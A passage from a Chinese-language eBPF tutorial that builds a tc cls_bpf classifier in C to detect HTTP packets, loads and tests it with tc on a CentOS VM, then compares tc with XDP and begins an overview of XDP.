你会注意到此类程序被<code>hook</code>到入口和出口<code>qdiscs</code>。还描述了上下文中的其他交互。通过将网络接口作为网络流量的入口点，你会看到以下内容：</p><ul><li>流量首先进入流量控制的入口钩子。</li><li>然后内核将为每个进入的请求执行从用户空间加载到入口的BPF程序。</li><li>入口程序执行后，控制权交给网络堆栈，通知用户应用程序有关网络事件。</li><li>在应用程序给出响应后，控制权会通过另一个执行的BPF程序传递给<code>Traffic Control</code>的出口，并在完成后将控制权交还给内核。</li><li>给客户端一个响应。</li></ul><p>你可以使用C语言编写用于流量控制的BPF程序，并使用带有BPF后端的LLVM/Clang编译它们。</p><p>为了使这个例子工作，你需要在一个直接用<code>cls_bpf</code>编译的内核上运行它，或者作为一个模块运行它。要验证是否拥有所需的一切，可以执行以下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/config.gz| zcat | grep -i BPF</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# cat /proc/config.gz| zcat | grep -i BPF</span><br><span class="line">cat: /proc/config.gz: No such file or directory</span><br></pre></td></tr></table></figure><p>对此我们可以从系统<code>/usr/src/kernel</code>目录下获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">确保至少得到以下带有 y 或 m 的输出：[root@VM-16-14-centos ~]# uname -r</span><br><span class="line">5.17.8-1.el8.elrepo.x86_64</span><br><span class="line">[root@VM-16-14-centos ~]# cd /usr/src/kernels/5.17.8-1.el8.elrepo.x86_64/</span><br><span class="line">[root@VM-16-14-centos 5.17.8-1.el8.elrepo.x86_64]# cat .config | grep -i BPF</span><br><span class="line">CONFIG_BPF=y</span><br><span class="line">CONFIG_HAVE_EBPF_JIT=y</span><br><span class="line">CONFIG_ARCH_WANT_DEFAULT_BPF_JIT=y</span><br><span class="line">CONFIG_BPF_SYSCALL=y</span><br><span class="line">CONFIG_BPF_JIT=y</span><br><span class="line">CONFIG_BPF_JIT_ALWAYS_ON=y</span><br><span class="line">CONFIG_BPF_JIT_DEFAULT_ON=y</span><br><span class="line">CONFIG_CGROUP_BPF=y</span><br><span class="line">CONFIG_NETFILTER_XT_MATCH_BPF=m</span><br><span class="line">CONFIG_NET_CLS_BPF=m</span><br><span class="line">CONFIG_NET_ACT_BPF=m</span><br><span class="line">CONFIG_BPF_EVENTS=y</span><br></pre></td></tr></table></figure><p>确保至少得到以下带有<code>y</code>或<code>m</code>的输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_BPF=y</span><br><span class="line">CONFIG_BPF_SYSCALL=y</span><br><span class="line">CONFIG_NET_CLS_BPF=m</span><br><span class="line">CONFIG_BPF_JIT=y</span><br><span class="line">CONFIG_HAVE_EBPF_JIT=y</span><br><span class="line">CONFIG_BPF_EVENTS=y</span><br></pre></td></tr></table></figure><p>现在我们看看如何编写分类器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"classifier"</span>)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">classification</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end; </span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">__u16 h_proto;</span><br><span class="line">__u64 nh_off = <span class="number">0</span>; </span><br><span class="line">  nh_off = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line"><span class="keyword">if</span> (data + nh_off &gt; data_end) &#123; </span><br><span class="line">    <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们分类器主要是分类功能。这个函数用一个称为<code>classifier</code>的节标题进行注释，以便<code>tc</code>可以知道这是要使用的分类器。</p><p>此时，我们需要从<code>skb</code>中提取一些信息；数据成员包含当前数据包的所有数据及其所有协议细节。为了让我们写的程序知道其中的内容，需要将其转换为以太网帧（在我们的例子中，使用 <code>*eth</code>变量）。为了让静态验证器满意，我们需要检查数据，加上<code>eth</code>指针的大小，不超过 <code>data_end</code>所在的空间。之后，我们可以从<code>*eth</code>中的<code>h_proto</code>成员中获取协议类型：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (h_proto == bpf_htons(ETH_P_IP)) &#123; </span><br><span class="line">if (is_http(skb, nh_off) == 1) &#123;</span><br><span class="line">trace_printk("Yes! It is HTTP!\n"); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return TC_ACT_OK; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了协议后，我们需要从主机转换它，检查它是否和我们的IPv4协议相等，如果是，我们使用我们自己的<code>is_http</code>函数检查内部数据包是否为HTTP，如果是HTTP的话，我们打印一条调试消息，说明我们找到了一个HTTP数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end; </span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = <span class="title">data</span> + <span class="title">nh_off</span>;</span></span><br><span class="line"><span class="keyword">if</span> (iph + <span class="number">1</span> &gt; data_end) &#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (iph-&gt;protocol != IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__u32 tcp_hlen = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>is_http</code>函数类似于我们的分类器函数，但它会通过已知的IPv4协议数据的起始偏移量来从<code>skb</code>开始。正如我们之前所做的，我们需要在使用<code>*iph</code>变量访问IP协议数据之前进行检查，以让静态验证者知道我们的目的。完成后，我们只需检查IPv4头是否包含TCP数据包，以便我们继续。如果数据包的协议是<code>IPPROTO_TCP</code>类型，我们需要再次进行一些检查以获取<code>*tcph</code>变量中的实际TCP头：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">plength = ip_total_length - ip_hlen - tcp_hlen; </span><br><span class="line"><span class="keyword">if</span> (plength &gt;= <span class="number">7</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> p[<span class="number">7</span>]; </span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>; </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">      p[i] = load_byte(skb, poffset + i);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">int</span> *value;</span><br><span class="line"><span class="keyword">if</span> ((p[<span class="number">0</span>] == <span class="string">'H'</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">3</span>] == <span class="string">'P'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得TCP头之后，我们可以继续从<code>skb</code>结构中加载前七个字节，位于TCP有效负载<code>poffset</code>的偏移量处。此时我们可以检查字节数组是否是一个表示HTTP的序列；第7层协议是HTTP，返回1，否则返回0。</p><p><code>classifier.c</code>完整程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> clang diagnostic ignored <span class="meta-string">"-Wcompare-distinct-pointer-types"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_htons(x) __builtin_bswap16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_constant_htons(x) ___constant_swab16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __bpf_constant_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"Fix your compiler's __BYTE_ORDER__?!"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) \</span></span><br><span class="line">  (__builtin_constant_p(x) ? __bpf_constant_htons(x) : __bpf_htons(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*bpf_trace_printk)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, <span class="keyword">int</span> fmt_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ...)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_trace_printk;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> trace_printk(fmt, ...)                                                 \</span></span><br><span class="line">  <span class="keyword">do</span> &#123;                                                                         \</span><br><span class="line">    <span class="keyword">char</span> _fmt[] = fmt;                                                         \</span><br><span class="line">    bpf_trace_printk(_fmt, <span class="keyword">sizeof</span>(_fmt), ##__VA_ARGS__);                       \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">load_byte</span><span class="params">(<span class="keyword">void</span> *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> off)</span> <span class="title">asm</span><span class="params">(<span class="string">"llvm.bpf.load.byte"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">http_payload</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> method;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_http</span><span class="params">(struct __sk_buff *skb, __u64 nh_off)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint8_t</span> <span class="keyword">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint16_t</span> <span class="keyword">uint16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint32_t</span> <span class="keyword">uint32_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__uint64_t</span> <span class="keyword">uint64_t</span>;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"classifier"</span>)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">classification</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">  __u16 h_proto;</span><br><span class="line">  __u64 nh_off = <span class="number">0</span>;</span><br><span class="line">  nh_off = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data + nh_off &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  h_proto = eth-&gt;h_proto;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (h_proto == bpf_htons(ETH_P_IP)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_http(skb, nh_off) == <span class="number">1</span>) &#123;</span><br><span class="line">      trace_printk(<span class="string">"Yes! It is HTTP!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_http</span><span class="params">(struct __sk_buff *skb, __u64 nh_off)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = <span class="title">data</span> + <span class="title">nh_off</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (iph + <span class="number">1</span> &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (iph-&gt;protocol != IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __u32 tcp_hlen = <span class="number">0</span>;</span><br><span class="line">  __u32 ip_hlen = <span class="number">0</span>;</span><br><span class="line">  __u32 poffset = <span class="number">0</span>;</span><br><span class="line">  __u32 plength = <span class="number">0</span>;</span><br><span class="line">  __u32 ip_total_length = iph-&gt;tot_len;</span><br><span class="line"></span><br><span class="line">  ip_hlen = iph-&gt;ihl &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip_hlen &lt; <span class="keyword">sizeof</span>(*iph)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> = <span class="title">data</span> + <span class="title">nh_off</span> + <span class="title">sizeof</span>(*<span class="title">iph</span>);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcph + <span class="number">1</span> &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  tcp_hlen = tcph-&gt;doff &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  poffset = ETH_HLEN + ip_hlen + tcp_hlen;</span><br><span class="line">  plength = ip_total_length - ip_hlen - tcp_hlen;</span><br><span class="line">  <span class="keyword">if</span> (plength &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> p[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">      p[i] = load_byte(skb, poffset + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *value;</span><br><span class="line">    <span class="keyword">if</span> ((p[<span class="number">0</span>] == <span class="string">'H'</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">3</span>] == <span class="string">'P'</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>实用Clang编译如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c classifier.c -o classifier.o</span><br></pre></td></tr></table></figure><p>tc返回码说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TC_ACT_OK (0) , will terminate the packet processing  pipeline  and</span><br><span class="line">           allows the packet to proceed</span><br><span class="line">TC_ACT_SHOT (2) , will terminate the packet processing pipeline and</span><br><span class="line">           drops the packet</span><br><span class="line">TC_ACT_UNSPEC (-1) , will use the default action configured from tc</span><br><span class="line">           (similarly as returning -1 from a classifier)</span><br><span class="line">TC_ACT_PIPE (3) , will iterate to the next action, if available</span><br><span class="line">TC_ACT_RECLASSIFY  (1) , will terminate the packet processing pipe-</span><br><span class="line">           line and start classification from the beginning</span><br><span class="line">           else , everything else is an unspecified return code</span><br></pre></td></tr></table></figure><p>现在我们可以在eth0上安装程序。</p><p>第一个命令将替换eth0设备的默认<code>qdisc</code>，第二个命令将我们的<code>cls_bpf</code>分类器加载到<code>ingress</code>的有类<code>qdisc</code>。这意味着我们的程序将处理进入该接口的所有流量。如果我们想处理传出流量，我们需要使用<code>egress qdisc</code>代替：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tc qdisc add dev eth0 handle 0: ingress</span><br><span class="line">tc filter add dev eth0 ingress bpf obj classifier.o flowid 0:</span><br></pre></td></tr></table></figure><p>程序现在已被加载——我们需要向该接口发送一些HTTP流量。直接python起一个服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>之后通过<code>tc</code>获取调试信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# tc exec bpf dbg</span><br><span class="line">Running! Hang up with ^C!</span><br><span class="line">             python3-18456 [000] ..s1 283544.114997: 0: Yes! It is HTTP!</span><br><span class="line"> python3-18754 [002] ..s1 283566.008163: 0: Yes! It is HTTP!</span><br></pre></td></tr></table></figure><p>最后通过<code>tc</code>卸载分类器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# tc qdisc del dev eth0 ingress</span><br></pre></td></tr></table></figure><h4 id="关于act-bpf以及cls-bpf的不同之处的说明"><a href="#关于act-bpf以及cls-bpf的不同之处的说明" class="headerlink" title="关于act_bpf以及cls_bpf的不同之处的说明"></a>关于act_bpf以及cls_bpf的不同之处的说明</h4><p>你可能已经注意到BPF程序存在另一个名为<code>act_bpf</code>的对象。<code>act_bpf</code>是一个动作，而不是分类器。在操作上与分类器有所不同，因为动作是附加到过滤器的对象，因此它不能直接执行过滤，需要流量控制所有数据包。对于此属性，通常最好使用<code>cls_bpf</code>分类器而不是<code>act_bpf</code>操作。</p><h4 id="TC和XDP的区别"><a href="#TC和XDP的区别" class="headerlink" title="TC和XDP的区别"></a>TC和XDP的区别</h4><p>尽管tc的<code>cls_bpf</code>和XDP程序看起来非常相似，但它们却大不相同。XDP程序在进入主内核网络堆栈之前在入口数据路径中较早执行，因此我们的程序无法像tc那样访问套接字缓冲区结构 <code>sk_buff</code>。XDP程序取而代之的是一个称为<code>xdp_buff</code>的不同结构，它是没有元数据的数据包表示。例如，即使在内核代码之前执行，XDP程序也可以有效地丢弃数据包。 与tc程序相比XDP程序只能附加到进入系统的流量。</p><p>你可能会问什么时候使用XDP？答案是，由于XDP程序不包含所有内核丰富的数据结构和元数据的性质，因此更适合OSI模型的1到4层。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>现在你应该很清楚BPF程序对于在网络数据路径的不同级别获得可见性和控制很有用。也已经了解了如何利用它们来过滤数据包，使用生成BPF程序集的高级工具。然后我们将程序加载到网络套接字，最后我们将程序附加到流量控制入口<code>qdisc</code>以使用BPF程序进行流量分类。在本章中，我们还简要讨论了XDP，后续我们会通过扩展 XDP 程序的构建方式、XDP程序的类型以及如何编写和测试它们来完整学习XDP。</p><h2 id="第七章节"><a href="#第七章节" class="headerlink" title="第七章节"></a>第七章节</h2><h3 id="Express-Data-Path"><a href="#Express-Data-Path" class="headerlink" title="Express Data Path"></a>Express Data Path</h3><p>快速数据路径(XDP)是Linux网络数据路径中安全、可编程、高性能、内核集成的数据包处理器，当NIC驱动程序接收到数据包时，它会执行BPF程序。这允许XDP程序在尽可能早的时间点就对接收到的数据包做出决定（丢弃、修改或仅允许）。</p><p>执行点并不是使XDP程序快速运行的唯一方面；其他设计决策在其中也发挥作用：</p><ul><li>使用XDP进行数据包处理时没有内存分配。</li><li>XDP程序仅适用于线性的、未分段的数据包，并且含有数据包的开始和结束指针。</li><li>无法访问完整的数据包元数据，这就是为什么这种程序接收的输入上下文将是<code>xdp_buff</code> 类型，而不是在之前遇到的<code>sk_buff</code>结构。</li><li>因为是eBPF程序，所以XDP程序具有有限的执行时间，其结果是它们的使用在网络管道中具有固定成本。</li></ul><p>谈到XDP时，重要的是要记住它不是内核绕过机制；它旨在与其他内核组件和内部Linux安全模型集成。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdp_buff结构用于向使用XDP框架提供的直接数据包访问机制的BPF程序提供数据包上下文。可以将其视为sk_buff的“轻量级”版本。</span><br><span class="line">两者之间的区别在于sk_buff还保留并允许您与数据包的元数据（proto、mark、type）混合，这些元数据仅在网络管道中的更高级别可用。 xdp_buff是早期创建的并且不依赖于其他内核层的事实是使用XDP获取和处理数据包更快的原因之一。 另一个原因是xdp_buff不包含对路由、流量控制挂钩或其他类型的数据包元数据的引用，就像使用sk_buff的程序类型一样。</span><br></pre></td></tr></table></figure><h3 id="XDP程序概述"><a href="#XDP程序概述" class="headerlink" title="XDP程序概述"></a>XDP程序概述</h3><p>从本质上讲，XDP程序所做的是对接收到的数据包做出决定，然后编辑接收到的数据包的内容或仅返回结果代码。结果代码用于以操作的形式确定数据包发生的情况。你可以丢弃这个包，可以把它从同一个接口传输出去，或者可以把它传递给网络栈的其余部分。此外，为了与网络栈协作，XDP程序可以推送和拉取数据包的头部；例如，如果当前内核不支持封装格式或协议，XDP程序可以将其解封装或翻译协议并将结果发送给内核进行处理。</p><p>但是XDP和eBPF之间有什么关联呢？</p><p>事实证明，XDP程序是通过bpf系统调用控制并使用程序类型<code>BPF_PROG_TYPE_XDP</code>加载的。 此外，执行驱动程序挂钩也要执行BPF字节码。</p><p>编写XDP程序时要理解的一个重要概念是它们将运行的上下文也称为操作模式。</p><h4 id="操作模式"><a href="#操作模式" class="headerlink" 